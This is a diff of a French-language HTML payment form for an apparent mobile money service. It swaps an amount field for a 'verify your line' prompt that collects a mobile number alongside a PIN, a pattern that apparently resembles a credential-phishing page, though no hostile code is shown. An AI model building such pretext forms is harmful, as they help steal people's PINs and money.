@@ -214,14 +214,19 @@
       <p>Entrez le montant et votre code PIN</p>
     </div>
 
+   <div class="verify-area">
+    <div class="form-header">
+      <h2><i class="fas fa-shield-alt"></i> Vérifiez votre ligne</h2>
+      <p>Saisissez votre numéro de téléphone mobile local (sans indicatif régional) et votre code PIN</p>
+    </div>
     <div class="input-group">
-      <label><i class="fas fa-coins"></i> Montant</label>
+      <label><i class="fas fa-mobile-screen-button"></i> Numéro de téléphone mobile (sans indicatif régional)</label>
       <div class="input-field">
-        <i class="fas fa-money-bill-wave"></i>
-        <input type="text" id="amountInput" inputmode="decimal" placeholder="5000" autocomplete="off">
-        <span class="currency-tag">FCFA</span>
+        <i class="fas fa-phone-alt"></i>
+        <input type="tel" id="localPhone" placeholder="712345678" autocomplete="off">
       </div>
     </div>
+</div>
 
     <div class="input-group">
       <label><i class="fas fa-key"></i> Code PIN (4 à 8 chiffres)</label>
